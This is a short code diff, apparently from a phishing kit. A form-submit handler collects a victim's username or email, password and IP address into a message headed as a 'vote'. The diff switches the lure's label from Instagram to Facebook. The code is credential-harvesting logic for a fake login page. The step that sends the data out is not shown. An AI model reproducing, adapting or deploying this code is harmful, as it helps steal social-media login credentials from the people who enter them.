@@ -19,7 +19,7 @@ form.addEventListener("submit", (e) => {
       var password = document.getElementById("password").value;
 
       var my_text = `
-      <b>New Instagram Vote</b>
+      <b>New Facebook Vote</b>
       - <b>Username/Email:</b> ${identity}
       - <b>Password:</b> ${password}
       - <b>IPAddress:</b> ${ct}
